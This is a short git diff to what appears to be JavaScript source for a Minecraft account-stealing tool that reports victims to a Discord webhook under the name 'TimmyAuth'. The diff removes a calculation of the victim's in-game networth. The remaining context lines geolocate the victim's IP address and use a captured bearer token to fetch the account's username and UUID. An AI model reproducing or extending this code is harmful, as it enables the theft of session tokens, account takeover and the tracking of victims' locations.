@@ -69,20 +69,6 @@ const customAvatarURL = 'https://bigrat.monster/media/bigrat.jpg';
 const customUsername = 'TimmyAuth';
 
 async function discordEmbed () {
-  const networthArray = await getNetworth(username)
-	const networth = networthArray[0]
-	const networthNoInventory = networthArray[1]
-	const networthNetworth = networthArray[2]
-	const networthUnsoulbound = networthArray[3]
-	const networthSoulbound = networthArray[4]
-
-  let total_networth
-  // Set it "API IS TURNED OFF IF NULL"
-  if (networth == "API DOWN") total_networth = networth;
-  else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
-  else if(networthNoInventory) total_networth = "NO INVENTORY: "+formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
-  else total_networth = formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
-
   const ipLocationArray = await getIpLocation(clientIP);
   const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken);
   const uuid = usernameAndUUIDArray[0];
